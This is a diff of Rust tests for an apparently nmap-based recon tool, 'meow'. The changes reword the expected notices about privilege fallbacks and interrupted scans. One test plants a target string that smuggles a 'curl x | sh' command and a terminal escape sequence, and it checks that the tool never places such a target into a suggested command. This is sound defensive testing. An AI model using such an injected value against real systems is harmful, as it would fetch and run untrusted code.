@@ -122,17 +122,14 @@ fn unprivileged_scans_fall_back_to_connect_and_drop_os_detection() {
         strings(&["-sT", "-T4", "-p-", "--script", "ssl-cert", "-sV", "-sTV"])
     );
     assert_eq!(notices.len(), 3);
-    assert!(notices[0].contains("-sS replaced with -sT"));
-    assert!(notices[1].contains("removed -O"));
+    assert!(notices[0].contains("connect scan instead of SYN scan"));
+    assert!(notices[1].contains("no OS detection"));
 
     // UDP needs root: left out, with a way to do it by hand.
     let (user, notices) = adapt_for_privilege(strings(&["-sU", "-sSU", "-T3"]), false);
     assert_eq!(user, strings(&["-sT", "-T3"]));
     assert_eq!(notices.len(), 2);
-    assert!(
-        notices[0].contains("left out the UDP scan in -sU"),
-        "{notices:?}"
-    );
+    assert!(notices[0].contains("no UDP scan (-sU)"), "{notices:?}");
     assert!(notices[0].contains("meow add udp.xml"), "{notices:?}");
     let (root, notices) = adapt_for_privilege(strings(&["-sU"]), true);
     assert_eq!((root, notices.len()), (strings(&["-sU"]), 0));
@@ -706,7 +703,6 @@ fn a_closed_session_stops_its_running_stage_and_drops_the_rest() {
     assert_eq!(task(&db, id).unwrap().unwrap(), after);
 
     // The next start is told of both, once.
-    let after_ports = STAGES.len() - 1 - STAGES.iter().position(|s| *s == Stage::Ports).unwrap();
     let (left, more) = take_left(&db).unwrap();
     assert_eq!(
         (left.as_slice(), more),
@@ -714,15 +710,12 @@ fn a_closed_session_stops_its_running_stage_and_drops_the_rest() {
     );
     assert_eq!(
         after.left_line(true),
-        format!(
-            "recon 192.0.2.5 stopped at ports when the last session ended; {after_ports} of 17 \
-             stages were not run. Run `meow recon 192.0.2.5` to scan again."
-        )
+        "Recon 192.0.2.5 cut short at ports \u{b7} `meow recon 192.0.2.5`"
     );
+    // None of its stages ran: "not run" says it all.
     assert_eq!(
         never.left_line(true),
-        "recon 192.0.2.6 was not finished when the last session ended; 17 of 17 stages were \
-         not run. Run `meow recon 192.0.2.6` to scan again."
+        "Recon 192.0.2.6 not run \u{b7} `meow recon 192.0.2.6`"
     );
     assert_eq!(take_left(&db).unwrap(), (Vec::new(), 0));
 }
@@ -840,8 +833,7 @@ fn a_recon_an_earlier_version_kept_for_a_resume_is_ended_too() {
     assert!(row.stages[2..].iter().all(StageRow::not_run));
     assert_eq!(
         row.left_line(true),
-        "recon 192.0.2.5 stopped at dns when the last session ended; 15 of 17 stages were not \
-         run. Run `meow recon 192.0.2.5` to scan again."
+        "Recon 192.0.2.5 cut short at dns \u{b7} `meow recon 192.0.2.5`"
     );
     assert!(task(&db, paused)
         .unwrap()
@@ -867,13 +859,12 @@ fn the_line_about_a_cut_recon_offers_only_the_users_own_targets() {
     // Stopped at the last stage: nothing was left out.
     assert_eq!(
         row.left_line(true),
-        "recon 192.0.2.10 stopped at dirs when the last session ended. Run `meow recon \
-         192.0.2.10` to scan again."
+        "Recon 192.0.2.10 cut short at dirs \u{b7} `meow recon 192.0.2.10`"
     );
     // Files that are not the user's own: no command is offered.
     assert_eq!(
         row.left_line(false),
-        "Dropped a scan that was queued in these files: recon 192.0.2.10"
+        "Dropped a scan queued in these files: recon 192.0.2.10"
     );
     // A target that is none (only a changed database holds one) is never
     // put into a command, and is shown as plain text.
@@ -881,10 +872,10 @@ fn the_line_about_a_cut_recon_offers_only_the_users_own_targets() {
     planted.target = "192.0.2.10`; curl x | sh #\u{1b}[2J".to_owned();
     let line = planted.left_line(true);
     assert!(
-        !line.contains("Run `") && !line.contains('\u{1b}'),
+        !line.contains("rerun") && !line.contains("`meow") && !line.contains('\u{1b}'),
         "{line}"
     );
-    assert!(line.starts_with("Dropped a scan that was queued in these files: recon 192.0.2.10"));
+    assert!(line.starts_with("Dropped a scan queued in these files: recon 192.0.2.10"));
 
     // More recons than are told one by one: the newest, and how many more.
     take_left(&db).unwrap();
